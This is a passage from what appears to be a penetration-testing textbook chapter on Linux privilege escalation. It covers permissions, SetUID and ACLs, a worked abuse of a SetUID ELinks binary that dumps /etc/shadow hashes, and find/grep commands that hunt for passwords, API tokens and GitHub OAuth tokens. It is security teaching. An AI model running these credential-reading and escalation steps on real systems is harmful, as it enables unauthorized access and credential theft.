<html><head></head><body>
<section epub:type="chapter" role="doc-chapter" aria-labelledby="ch9">&#13;
<hgroup>&#13;
<h1 class="CHAPTER" id="ch9">&#13;
<span class="CN"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_201" aria-label="201"/><span class="SANS_Futura_Std_Bold_Condensed_B_11">9</span></span>&#13;
<span class="CT"><span class="SANS_Dogma_OT_Bold_B_11">PRIVILEGE ESCALATION</span></span>&#13;
</h1>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt=""/></figure>&#13;
<p class="COS">In this chapter, you’ll learn about the various ways that unintentional system misconfigurations and a lack of hardening could help you elevate your privileges on a compromised host. We’ll explore how the Linux operating system grants permissions, examine a system’s <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">PATH</span> configurations, automate the search for sensitive files, manipulate vulnerable cron jobs, attack system accounts, discover kernel exploits, and more.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
<h2 class="H1" id="sec1"><span id="h1-72"/><span class="SANS_Futura_Std_Bold_B_11">What Is Privilege Escalation?</span></h2>&#13;
<p class="TNI1"><i>Privilege escalation</i> occurs when a low-privileged user is able to perform privileged operations that are outside the scope of the current user’s identity permissions by abusing misconfigurations, taking over other accounts, or exploiting other vulnerabilities. It’s an important stage in the compromise <span role="doc-pagebreak" epub:type="pagebreak" id="pg_202" aria-label="202"/>chain, because low-privileged accounts limit the actions you can take on a system. The following are examples of actions that an attacker might take but that are usually forbidden for nonroot users:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Reading system files that may contain sensitive information</li>&#13;
<li class="ListBullet">Creating files and folders in privileged system locations</li>&#13;
<li class="ListBullet">Creating additional system users or modifying existing ones</li>&#13;
<li class="ListBullet">Modifying or deleting sensitive files, such as logs</li>&#13;
<li class="ListBullet">Installing system-wide software packages</li>&#13;
<li class="ListBullet">Modifying the configuration of services</li>&#13;
<li class="ListBullet">Enabling, disabling, or restarting services</li>&#13;
</ul>&#13;
<p class="TX">Of course, if misconfigurations exist on a system, we might be able to perform these actions from low-privileged accounts. For example, we might be able to write to a directory if it has the wrong permissions set, or read a sensitive file if it were copied to a path that is accessible by all system users and happened to inherit the permissions of its new location.</p>&#13;
<p class="TX">Numerous conditions can enable privilege escalation: configuration mistakes, a lack of system hardening, poor software design, assumptions about the environment, and so on. Here are technical and theoretical examples that could lead to privilege escalation conditions:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Using vulnerable software packages or kernel versions</li>&#13;
<li class="ListBullet">Granting overly lax permissions on dangerous utilities or processes</li>&#13;
<li class="ListBullet">Running applications by using privileged context, such as root</li>&#13;
<li class="ListBullet">Assuming that all users are to be trusted</li>&#13;
<li class="ListBullet">Storing reused credentials in files accessible to all users</li>&#13;
</ul>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
<h2 class="H1" id="sec2"><span id="h1-73"/><span class="SANS_Futura_Std_Bold_B_11">Linux File and Directory Permissions</span></h2>&#13;
<p class="TNI1">Every file and directory has a configuration made up of read (<span class="SANS_TheSansMonoCd_W5Regular_11">r</span>), write (<span class="SANS_TheSansMonoCd_W5Regular_11">w</span>), and execute (<span class="SANS_TheSansMonoCd_W5Regular_11">x</span>) permissions. In addition, every file and directory is owned by a user and a group. As you learned in the previous chapter, Linux defines users in <i>/etc/passwd</i> and groups in <i>/etc/group</i>. Administrators grant permissions to a particular user, a particular group, and anyone else (also called <i>others</i>).</p>&#13;
<p class="TX">File and directory permissions and ownership can be changed accidentally or <i>made loose</i> because of a misconfiguration, meaning these resources have the potential to be exposed to unauthorized users. It is important to spot these misconfigurations when performing penetration tests.</p>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
<h3 class="H2" id="sec3"><span id="h2-133"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Viewing Permissions</span></h3>&#13;
<p class="TNI1">Let’s examine the permission and ownership assignments of the <i>/etc/passwd</i> file as an example. We’ll walk through the bolded part of the output, from left to right:</p>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_203" aria-label="203"/>$ <b>ls -l /etc/passwd</b>&#13;
&#13;
<b>-rw-r--r--</b><b> </b>1<b> root root</b> 1341 Jun 28 01:11 /etc/passwd&#13;
</code></pre>&#13;
<p class="TX">The first character represents the type of resource. A hyphen (<span class="SANS_TheSansMonoCd_W5Regular_11">-</span>) indicates a file, while the <span class="SANS_TheSansMonoCd_W5Regular_11">d</span> character would represent a directory.</p>&#13;
<p class="TX">Next, <span class="SANS_TheSansMonoCd_W5Regular_11">rw-</span> represents the file’s owner permissions. In this case, the permissions are set to read (<span class="SANS_TheSansMonoCd_W5Regular_11">r</span>) and write (<span class="SANS_TheSansMonoCd_W5Regular_11">w</span>). The last hyphen is a placeholder for the execute (<span class="SANS_TheSansMonoCd_W5Regular_11">x</span>) permission, which isn’t set here.</p>&#13;
<p class="TX">The next set of permissions (<span class="SANS_TheSansMonoCd_W5Regular_11">r--</span>) belongs to the group and indicates read access only. Other users also have only read access. The two instances of <span class="SANS_TheSansMonoCd_W5Regular_11">root</span> represent the identity of the file’s owner and group: the <i>root</i> user and the root group. <a href="chapter9.xhtml#fig9-1">Figure 9-1</a> illustrates this permission breakdown in a digestible way.</p>&#13;
<figure class="IMG"><img id="fig9-1" class="img5" src="../images/pg203.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 9-1: Basic file permissions</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">In practice, these permissions mean that all local accounts can read the file but that only the <i>root</i> user can modify it.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
<h3 class="H2" id="sec4"><span id="h2-134"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Setting Permissions</span></h3>&#13;
<p class="TNI1">We set Linux file and directory permissions by using the <span class="SANS_TheSansMonoCd_W5Regular_11">chmod</span> command, and set file and directory ownership by using the <span class="SANS_TheSansMonoCd_W5Regular_11">chown</span> command. To see these commands in action, create an empty file named <i>my_new_file.txt</i> on your Kali machine:</p>&#13;
<pre><code>$ <b>cd ~</b>&#13;
$ <b>touch my_new_file.txt</b>&#13;
</code></pre>&#13;
<p class="TX">Next, set this file’s user and group to <i>kali</i>:</p>&#13;
<pre><code>$ <b>chown kali:kali my_new_file.txt</b></code></pre>&#13;
<p class="TX">Now set read, write, and execute permissions for the user (<span class="SANS_TheSansMonoCd_W5Regular_11">u+rwx</span>), read permissions for the group (<span class="SANS_TheSansMonoCd_W5Regular_11">g+r</span>), and read permissions for everyone else (<span class="SANS_TheSansMonoCd_W5Regular_11">o+r</span>):</p>&#13;
<pre><code>$ <b>chmod u+rwx,g+r,o+r my_new_file.txt</b>&#13;
$ <b>ls -l my_new_file.txt</b>&#13;
&#13;
-rwxr--r-- 1 kali kali 0 Jun 27 22:28 my_new_file.txt&#13;
</code></pre>&#13;
<p class="TX">We can also represent file and directory permissions (but not ownership) by using <i>octal representation</i>, which uses the digits 0 through 7. We set one digit for the user, one for the group, and one for others, producing a <span role="doc-pagebreak" epub:type="pagebreak" id="pg_204" aria-label="204"/>value such as <span class="SANS_TheSansMonoCd_W5Regular_11">777</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">700</span>, or <span class="SANS_TheSansMonoCd_W5Regular_11">440</span>. The permissions correspond to the following octal values:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">The read (<span class="SANS_TheSansMonoCd_W5Regular_11">r</span>) permission is <span class="SANS_TheSansMonoCd_W5Regular_11">4</span>.</li>&#13;
<li class="ListBullet">The write (<span class="SANS_TheSansMonoCd_W5Regular_11">w</span>) permission is <span class="SANS_TheSansMonoCd_W5Regular_11">2</span>.</li>&#13;
<li class="ListBullet">The execute (<span class="SANS_TheSansMonoCd_W5Regular_11">x</span>) permission is <span class="SANS_TheSansMonoCd_W5Regular_11">1</span>.</li>&#13;
<li class="ListBullet">The no permission value is <span class="SANS_TheSansMonoCd_W5Regular_11">0</span>.</li>&#13;
</ul>&#13;
<p class="TX">To grant read, write, and execute permissions to everyone (that is, the user owner, the group, and anyone else), we’d add the three permission numbers. Read (<span class="SANS_TheSansMonoCd_W5Regular_11">4</span>), write (<span class="SANS_TheSansMonoCd_W5Regular_11">2</span>), and execute (<span class="SANS_TheSansMonoCd_W5Regular_11">1</span>) added together equal <span class="SANS_TheSansMonoCd_W5Regular_11">7</span>. This means that if you set the permission <span class="SANS_TheSansMonoCd_W5Regular_11">777</span>, everyone would get read, write, and execute permissions.</p>&#13;
<p class="TX">What if we want to grant only the user read access but deny access to the group and everyone else? Here is an example of how to do this:</p>&#13;
<pre><code>$ <b>chmod 400 my_new_file.txt</b>&#13;
$ <b>ls -l my_new_file.txt</b>&#13;
&#13;
-r-------- 1 kali kali 0 Jun 27 22:30 my_new_file.txt&#13;
</code></pre>&#13;
<p class="TX">We use the octal value of <span class="SANS_TheSansMonoCd_W5Regular_11">400</span>, as <span class="SANS_TheSansMonoCd_W5Regular_11">4</span> grants read access to the user and the two <span class="SANS_TheSansMonoCd_W5Regular_11">0</span> values set zero permissions for the group and everyone else.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
<h3 class="H2" id="sec5"><span id="h2-135"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Creating File Access Control Lists</span></h3>&#13;
<p class="TNI1">We’ve covered the fundamentals of file and directory permissions and ownership, but a few other security mechanisms could also grant or prevent user access.</p>&#13;
<p class="TX"><i>File access control lists (ACLs)</i> allow you to set additional permissions on files and directories at a more granular level. For example, say we have a group called <i>sysadmins</i> with a few members, such as Alice, Bob, and Eve, and we need to grant access to Alice and Bob, but not Eve. Setting the sysadmins group on a file or directory would instead grant all members access. ACLs allow us to grant or deny access to specific users on top of the existing permission scheme.</p>&#13;
<p class="TX">The next example assumes you have a group named <i>sysadmins</i> and system users named Alice, Bob, and Eve. You can use the following commands to create these resources:</p>&#13;
<pre><code>$ <b>sudo groupadd sysadmins</b>&#13;
$ <b>sudo useradd eve -G sysadmins</b>&#13;
$ <b>sudo useradd alice -G sysadmins</b>&#13;
$ <b>sudo useradd bob -G sysadmins</b>&#13;
</code></pre>&#13;
<p class="TX">Next, let’s create a new empty file and observe its default ACLs. We use the <span class="SANS_TheSansMonoCd_W5Regular_11">getfacl</span> command to achieve this:</p>&#13;
<pre><code>$ <b>touch facl_example.txt</b>&#13;
$ <b>getfacl facl_example.txt</b>&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_205" aria-label="205"/># file: facl_example.txt&#13;
# owner: kali&#13;
# group: kali&#13;
&#13;
user::rw-&#13;
group::r--&#13;
other::r--&#13;
</code></pre>&#13;
<p class="TX">Now we’ll grant read access to the <i>sysadmins</i> group to ensure that Alice and Bob, who are members, can access it:</p>&#13;
<pre><code>$ <b>touch facl_example.txt</b>&#13;
$ <b>setfacl -m g:sysadmins:r-- facl_example.txt</b>&#13;
</code></pre>&#13;
<p class="TX">We pass the modify (<span class="SANS_TheSansMonoCd_W5Regular_11">-m</span>) flag to <span class="SANS_TheSansMonoCd_W5Regular_11">setfacl</span> so it modifies permissions, followed by the group name, the desired permissions (<span class="SANS_TheSansMonoCd_W5Regular_11">g:sysadmins:r--</span>), and the target file or directory.</p>&#13;
<p class="TX">At this point, all members of the group can read the file. How do we now exclude a particular user? Run the following command to remove all permissions for Eve:</p>&#13;
<pre><code>$ <b>setfacl -m u:eve:--- facl_example.txt</b></code></pre>&#13;
<p class="TX">Listing the ACL permissions again should show that Eve has no access to the file:</p>&#13;
<pre><code>$ <b>getfacl facl_example.txt</b>&#13;
&#13;
# file: facl_example.txt&#13;
# owner: kali&#13;
# group: kali&#13;
&#13;
user::rwx&#13;
user:eve:---&#13;
group::r--&#13;
group:sysadmins:r--&#13;
mask::r--&#13;
other::r--&#13;
</code></pre>&#13;
<p class="TX">When a file or directory has ACLs set, Linux will show a plus sign (<span class="SANS_TheSansMonoCd_W5Regular_11">+</span>) when you view the file’s permissions:</p>&#13;
<pre><code>-rw-r--r--<b>+</b> 1 kali kali    0 Jun 27 22:52 facl_example.txt</code></pre>&#13;
<p class="TX">It’s important to be aware that this security control is available.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
<h3 class="H2" id="sec6"><span id="h2-136"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Viewing SetUID and SetGID</span></h3>&#13;
<p class="TNI1"><i>Set User ID (SetUID)</i> is a special permission that can be set on executable files. It allows the executable to run with the permission of the user who owns the executable. For example, imagine that a script allows users on the system <span role="doc-pagebreak" epub:type="pagebreak" id="pg_206" aria-label="206"/>to delete logfiles from the <i>/var/log</i> path. To do this without granting root privileges to users, a sysadmin can set the SetUID bit on the executable file. Likewise, the <i>Set Group ID (SetGID)</i> permission allows users to run executable files with the permissions of the owning group.</p>&#13;
<p class="TX">When an executable file has SetUID or SetGID set, you’ll see <span class="SANS_TheSansMonoCd_W5Regular_11">s</span> instead of <span class="SANS_TheSansMonoCd_W5Regular_11">x</span> in the file’s permissions. One file that uses both SetUID and SetGID is the At scheduler binary <i>/usr/bin/at</i>, which we used in <span class="Xref"><a href="chapter8.xhtml">Chapter 8</a></span> for task scheduling when we used the <span class="SANS_TheSansMonoCd_W5Regular_11">at</span> command. Run the following command to see SetUID and SetGID:</p>&#13;
<pre><code>$ <b>ls -l /usr/bin/at</b>&#13;
&#13;
-rw<b>s</b>r-<b>s</b>r-x 1 daemon daemon 59768 Oct 15 /usr/bin/at&#13;
</code></pre>&#13;
<p class="TX">Here, you can see that SetUID is set, as indicated by the first <span class="SANS_TheSansMonoCd_W5Regular_11">s</span> in the permissions, followed by SetGID, as indicated by the second <span class="SANS_TheSansMonoCd_W5Regular_11">s</span>. Thus, when users run the <span class="SANS_TheSansMonoCd_W5Regular_11">at</span> command, they run it with the permissions of the <i>daemon</i> user and group.</p>&#13;
<p class="TX">Another example of a command that uses the SetUID set to its executable is <span class="SANS_TheSansMonoCd_W5Regular_11">passwd</span>, which changes account passwords. Executables set with SetUID and SetGID can be a security risk and are a prime target for privilege escalation. We will demonstrate an exploitation example in <span class="Xref">“Exploiting a SetUID Misconfiguration” on <a href="#pg_208">page 208</a>.</span></p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
<h3 class="H2" id="sec7"><span id="h2-137"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Setting the Sticky Bit</span></h3>&#13;
<p class="TNI1">When the <i>sticky bit</i> is set on a directory, files under that directory can’t be deleted by users or groups who don’t own the files, even if the file’s permissions would otherwise allow the deletion. A good example of a directory with the sticky bit set is <i>/tmp</i>. Run the following command to see it:</p>&#13;
<pre><code>$ <b>ls -ld /tmp</b>&#13;
&#13;
drwxrwxrw<b>t</b> 11 root root 4096 Jun 28 21:58 /tmp&#13;
</code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">t</span> means the sticky bit is set on this directory. To set a sticky bit on a directory, run the following commands:</p>&#13;
<pre><code>$ <b>mkdir /tmp/test</b>&#13;
$ <b>chmod +t /tmp/test</b>&#13;
$ <b>ls -ld /tmp/test</b>&#13;
&#13;
drwxr-xr-t 2 kali kali 4096 Jun 28 22:06 /tmp/test&#13;
</code></pre>&#13;
<p class="TX">You can also set the SetUID, SetGID, or sticky bit via the octal representation by prepending an additional digit before the permission: the sticky bit is <span class="SANS_TheSansMonoCd_W5Regular_11">1</span>, SetGID is <span class="SANS_TheSansMonoCd_W5Regular_11">2</span>, and SetUID is <span class="SANS_TheSansMonoCd_W5Regular_11">4</span>. To demonstrate this, let’s copy a binary from the system and change its permissions. Copy the <i>ping</i> binary into the <i>/tmp</i> directory and name it <i>ping.backup</i>:</p>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_207" aria-label="207"/>$ <b>cp /usr/bin/ping /tmp/ping.backup</b>&#13;
$ <b>ls -l /tmp/ping.backup</b>&#13;
&#13;
-rwxr-xr-x 1 kali kali 90568 Jun 28 22:21 /tmp/ping.backup&#13;
</code></pre>&#13;
<p class="TX">Next, set the file with the octal permission notation of <span class="SANS_TheSansMonoCd_W5Regular_11">4700</span>:</p>&#13;
<pre><code>$ <b>chmod 4700 /tmp/ping.backup</b>&#13;
&#13;
$ <b>ls -l /tmp/ping.backup</b>&#13;
&#13;
-rws------ 1 kali kali 90568 Jun 28 22:21 /tmp/ping.backup&#13;
</code></pre>&#13;
<p class="TX">This sets SetUID (<span class="SANS_TheSansMonoCd_W5Regular_11">4</span>), followed by read, write, and execute permissions for the user-owner only (<span class="SANS_TheSansMonoCd_W5Regular_11">700</span>).</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
<h2 class="H1" id="sec8"><span id="h1-74"/><span class="SANS_Futura_Std_Bold_B_11">Finding Files Based on Permissions</span></h2>&#13;
<p class="TNI1"><span class="Xref"><a href="chapter8.xhtml">Chapter 8</a></span> covered the FHS, which aims to standardize the locations of certain files and directories on Linux systems. But files, whether they’re configurations or the source code of an application, could live pretty much anywhere, so it’s important to figure out what is accessible to our current privilege context.</p>&#13;
<p class="TX">Luckily, searching for readable, writable, and executable files and directories is quite easy. Tools such as <span class="SANS_TheSansMonoCd_W5Regular_11">find</span> can even locate files based on permissions. Let’s explore how to do this.</p>&#13;
<p class="TX">To search for files and directories that are readable by everyone on a system (meaning <i>others</i>), beginning from the root directory and searching recursively, use the following command:</p>&#13;
<pre><code>$ <b>find / -perm -o=r</b></code></pre>&#13;
<p class="TX">To search for files only, pass the <span class="SANS_TheSansMonoCd_W5Regular_11">-type f</span> flag, and to search directories only, pass the <span class="SANS_TheSansMonoCd_W5Regular_11">-type d</span> flag:</p>&#13;
<pre><code>$ <b>find / -type f -perm -o=r</b>&#13;
$ <b>find / -type d -perm -o=r</b>&#13;
</code></pre>&#13;
<p class="TX">To suppress any access-denied errors while searching, pipe the standard error stream to <i>/dev/null</i>:</p>&#13;
<pre><code>$ <b>find / -perm -o=r 2&gt; /dev/null</b></code></pre>&#13;
<p class="TX">To search for files and directories that anyone can write to, use the following command:</p>&#13;
<pre><code>$ <b>find / -perm -o=w</b></code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_208" aria-label="208"/>A search for executable files and directories follows the same pattern. To search for files and directories that are executable by everyone, use the following command:</p>&#13;
<pre><code>$ <b>find / -perm -o=x</b></code></pre>&#13;
<p class="TX">The term <i>executable directories</i> may sound confusing, but essentially, setting an executable permission (<span class="SANS_TheSansMonoCd_W5Regular_11">x</span>) on a folder allows users to navigate into the directory (for example, with <span class="SANS_TheSansMonoCd_W5Regular_11">cd</span>).</p>&#13;
<p class="TX">You can combine these commands into one, such as the following:</p>&#13;
<pre><code>$ <b>find / -type f -perm -o=rwx</b></code></pre>&#13;
<p class="TX">This command finds all globally readable, writable, and executable files.</p>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">find</span> command also allows us to search for particular permissions by using the <span class="SANS_TheSansMonoCd_W5Regular_11">-perm</span> flag. We could use this to search for files set with either SetUID or SetGID. The following searches for SetGID files:</p>&#13;
<pre><code>$ <b>find / -perm -4000 2&gt; /dev/null</b></code></pre>&#13;
<p class="TX">Similarly, this command searches for SetUID files:</p>&#13;
<pre><code>$ <b>find / -perm -2000 2&gt; /dev/null</b></code></pre>&#13;
<p class="TX">We can also locate directories set with the sticky bit flag:</p>&#13;
<pre><code>$ <b>find / -perm -1000 2&gt; /dev/null</b></code></pre>&#13;
<p class="TX">Searching for these special permissions will likely yield results on most Linux systems, as some files have these permissions set by default. It’s important to become familiar with these files so you can easily distinguish between default system files and ones that were modified by the system owner.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
<h2 class="H1" id="sec9"><span id="h1-75"/><span class="SANS_Futura_Std_Bold_B_11">Exploiting a SetUID Misconfiguration</span></h2>&#13;
<p class="TNI1">Let’s exploit a program with the SetUID bit set. On the compromised machines, run a system-wide search for SetUID and SetGID files, then perform an internet search to figure out which of these files are meant to have these flags set and which are misconfigured.</p>&#13;
<p class="TX">Your search should identify <i>ELinks</i>, a web browser that allows users to surf websites directly from the command line by displaying results as simple text output. <a href="chapter9.xhtml#fig9-2">Figure 9-2</a> shows what browsing Google looks like when using ELinks.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_209" aria-label="209"/>&#13;
<figure class="IMG"><img id="fig9-2" class="img1" src="../images/pg209.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 9-2: Browsing Google</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">with the ELinks command line web browser</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">On the backup user account of <i>p-jumpbox-01</i> (172.16.10.13), you should find the ELinks binary located at <i>/usr/bin/elinks.</i> To verify that the SetUID is set, use the <span class="SANS_TheSansMonoCd_W5Regular_11">ls</span> or the <span class="SANS_TheSansMonoCd_W5Regular_11">stat</span> command:</p>&#13;
<pre><code>$ <b>stat /usr/bin/elinks</b>&#13;
&#13;
  File: /usr/bin/elinks&#13;
  Size: 1759424       Blocks: 3440       IO Block: 4096   regular file&#13;
Device: 0,57 Inode:  4763007             Links: 1&#13;
Access: <b>(4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)</b>&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="TX">ELinks will execute in the <i>root</i> context when we run it, so if we’re able to get it to do something interesting, like read a local file, we should be able to access sensitive files available only to <i>root</i>. Explore the ELinks options by passing the <span class="SANS_TheSansMonoCd_W5Regular_11">--help</span> flag to the command:</p>&#13;
<pre><code>$ <b>elinks --help</b>&#13;
&#13;
Usage: elinks [OPTION]... [URL]...&#13;
Options:&#13;
  -anonymous [0|1]      Restrict to anonymous mode&#13;
  -auto-submit [0|1]    Autosubmit first form&#13;
  -base-session &lt;num&gt;   Clone internal session with given ID&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="TX">Next, use the <span class="SANS_TheSansMonoCd_W5Regular_11">-dump 1</span> flag to read a website address and print it to the standard output stream:</p>&#13;
<pre><code>$ <b>elinks https://google.com -dump 1</b></code></pre>&#13;
<p class="TX">ELinks should parse data from the website, such as a collection of links, and print it to the terminal.</p>&#13;
<p class="TX">How might we exploit this behavior? Well, just as the <i>http://</i> or <i>https://</i> schemes allow us to read data from websites, the <i>file:///</i> scheme allows web browsers to read files on the local system. Since we’re running as root, we can read sensitive paths such as <i>/etc/shadow</i>, which stores password hashes:</p>&#13;
<pre><code>$ <b>elinks file:///etc/shadow -dump 1</b>&#13;
&#13;
root:*:19523:0:99999:7::: daemon:*:19523:0:99999:7:::&#13;
jmartinez:$y$j9T$jHIwZ8SKS4GGK9GrHOHTu.$rOJY2gSlP6ZgN2IB0qoW0oBFgs6DWiBH&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_210" aria-label="210"/>acroSQw8Ir7:19536:0:99999:7:::&#13;
dbrown:$y$j9T$hDNnbY/r00FC/jeE4BfCL1$6HbLxT8T7D6sUebz1T0fp0xdTjIjVoWjTLM&#13;
DMdiHZBD:19536:0:99999:7:::&#13;
ogarcia:$y$j9T$aiqqNSE8dqtvZ62otyoOB/$2mLRlxi4iSlJxV5qTjbqdKSVyc4aGFKtpz&#13;
pn4YjZNID:19536:0:99999:7:::&#13;
arodriguez:$y$j9T$htdo8u5CtRaOiHkFxx.s7/$lzBMPHzw96si.CI3eIFjJj0FfdqwgNH&#13;
efhya0VpQso.:19536:0:99999:7:::&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="TX">It’s important to note that while we abused ELinks, we didn’t exploit a vulnerability in ELinks itself; rather, we used a well-known browser feature for malicious purposes with the help of the SetUID bit.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
<h2 class="H1" id="sec10"><span id="h1-76"/><span class="SANS_Futura_Std_Bold_B_11">Scavenging for Credentials</span></h2>&#13;
<p class="TNI1">In this section, we cover places on the system where you might find sensitive files containing credentials. Even encrypted credentials could be weak and brute-forceable, and you might find them used across multiple servers. Privilege escalation doesn’t always involve a highly sophisticated exploit; if you discover credentials lying around on disk, you might be able to simply log in to a more powerful account.</p>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
<h3 class="H2" id="sec11"><span id="h2-138"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Passwords and Secrets</span></h3>&#13;
<p class="TNI1">Passwords and secrets, such as API keys, can live in many places on a system. Administrators might run commands that contain their usernames and passwords, applications may log credentials in logfiles, and configuration files may contain credentials as part of a connection string. Search for credentials in places such as the following:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Configuration files under the <i>/etc</i> directory</li>&#13;
<li class="ListBullet">Environment variables</li>&#13;
<li class="ListBullet">Logfiles</li>&#13;
<li class="ListBullet">History files of users</li>&#13;
<li class="ListBullet">Scheduled tasks, such as cron jobs</li>&#13;
<li class="ListBullet">Script files written in languages such as bash or Python</li>&#13;
<li class="ListBullet">Memory</li>&#13;
<li class="ListBullet">Boot configuration files</li>&#13;
<li class="ListBullet">Keyrings</li>&#13;
<li class="ListBullet">System files such as <i>/etc/shadow</i></li>&#13;
</ul>&#13;
<p class="TX">There are multiple approaches to uncovering such secrets. We could use bash to recursively search for password patterns, craft searches for specific files and extensions of interest, or manually inspect sensitive filesystem areas.</p>&#13;
<p class="TX">Let’s modify the search techniques introduced in <span class="Xref">“Finding Files Based on Permissions” on <a href="#pg_207">page 207</a></span> to look for specific filenames of interest. For <span role="doc-pagebreak" epub:type="pagebreak" id="pg_211" aria-label="211"/>example, search for readable files with the word <i>password</i> in them by using a case-insensitive <span class="SANS_TheSansMonoCd_W5Regular_11">grep</span> filter:</p>&#13;
<pre><code>$ <b>find . -type f -exec grep -i password {} \;</b></code></pre>&#13;
<p class="TX">Then search for readable files that contain words such as <i>api_key</i>, <i>token</i>, and <i>key</i>:</p>&#13;
<pre><code>$ <b>find . -type f -exec grep -i "api_key\|token\|apitoken\|key" {} \;</b></code></pre>&#13;
<p class="TX">You might also search for readable files with specific extensions like <i>.hashes</i>, <i>.env</i>, and <i>.credentials</i>:</p>&#13;
<pre><code>$ <b>find . -type f -name "*.hashes" -o -name "*.env" -o -name "*.credentials"</b></code></pre>&#13;
<p class="TX">Searching for hardcoded credentials without running into false positives is an art, but you could use data gleaned from the reconnaissance phase or external resources to build more fine-tuned search patterns.</p>&#13;
<p class="TX">One such resource is Nuclei’s inventory of templates for finding interesting data (such as passwords, API tokens, and cloud account IDs) in local files: <i><a href="https://github.com/projectdiscovery/nuclei-templates/tree/main/file/keys">https://github.com/projectdiscovery/nuclei-templates/tree/main/file/keys</a></i>. For instance, the <i>github-oauth-token.yaml</i> template searches for the GitHub Open Authentication (OAuth) tokens used to log in to GitHub accounts:</p>&#13;
<pre><code>id: github-oauth-token&#13;
&#13;
info:&#13;
  name: Github OAuth Access Token&#13;
  author: tanq16&#13;
  severity: high&#13;
  tags: token,file,github&#13;
&#13;
file:&#13;
  - extensions:&#13;
      - all&#13;
&#13;
    extractors:&#13;
      - type: regex&#13;
        regex:&#13;
          <b>- "gho_.{36}"</b>&#13;
</code></pre>&#13;
<p class="TX">This template looks for strings that start with the character sequence <span class="SANS_TheSansMonoCd_W5Regular_11">gho_</span> and are followed by a string of 32 characters. If you don’t want to use Nuclei, you could input this regular expression into a <span class="SANS_TheSansMonoCd_W5Regular_11">grep</span> search:</p>&#13;
<pre><code>$ <b>grep -E 'gho_.{36}' somefile.txt</b></code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_212" aria-label="212"/>We use <span class="SANS_TheSansMonoCd_W5Regular_11">grep -E</span> to specify a regular-expression-based filter. Alternatively, you could use <span class="SANS_TheSansMonoCd_W5Regular_11">egrep</span>, a wrapper to the <span class="SANS_TheSansMonoCd_W5Regular_11">grep</span> command that passes the <span class="SANS_TheSansMonoCd_W5Regular_11">-E</span> flag under the hood, for convenience:</p>&#13;
<pre><code>$ <b>egrep 'gho_.{36}' somefile.txt</b></code></pre>&#13;
<p class="TX">You could also pass the <span class="SANS_TheSansMonoCd_W5Regular_11">-R</span> flag to perform a recursive search:</p>&#13;
<pre><code>$ <b>grep -R 'gho_.{36}' /some_directory</b></code></pre>&#13;
<p class="TX">This is useful for searching a directory that has many files, such as a web application’s source code directory.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
<h3 class="H2" id="sec12"><span id="h2-139"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Private Keys</span></h3>&#13;
<p class="TNI1">Private keys are a huge asset to penetration testers. We can use them to connect to servers, decrypt files, perform man-in-the-middle attacks, and more. You might find private keys in restricted folders, such as <i>/root</i>, or in an individual user’s home directory, depending on its type and owner.</p>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
<h4 class="H3" id="sec13"><span class="SANS_Futura_Std_Bold_Condensed_B_11">SSH Keys</span></h4>&#13;
